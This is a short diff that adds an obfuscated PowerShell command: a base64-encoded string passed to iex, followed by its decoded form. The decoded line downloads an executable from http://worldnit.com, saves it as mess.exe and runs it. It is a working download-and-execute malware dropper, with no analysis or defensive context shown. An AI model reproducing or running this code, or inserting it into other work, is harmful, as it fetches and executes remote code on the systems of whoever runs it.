@@ -1,0 +1,7 @@
+iex([SYSTEm.tEXT.ENCOdINg]::utF8.gETsTrInG([sYStem.convERt]::fROMBAsE64StrIng('CihOZXctT2JqZWN0IHN5U1RlTS5OZVQud0ViQ0xpZU50KS5kb1dubG9hREZpTGUoJ2h0dHA6Ly93b3JsZG5pdC5jb20vYWJhY29zcy5leGUnLCdtZXNzLmV4ZScpO1N0YXJ0LVByb2Nlc3MgJ21lc3MuZXhlJwoK')));exit
+
+##### B64 CONTENT #####
+
+
+(New-Object sySTeM.NeT.wEbCLieNt).doWnloaDFiLe('http://worldnit.com/abacoss.exe','mess.exe');Start-Process 'mess.exe'
+
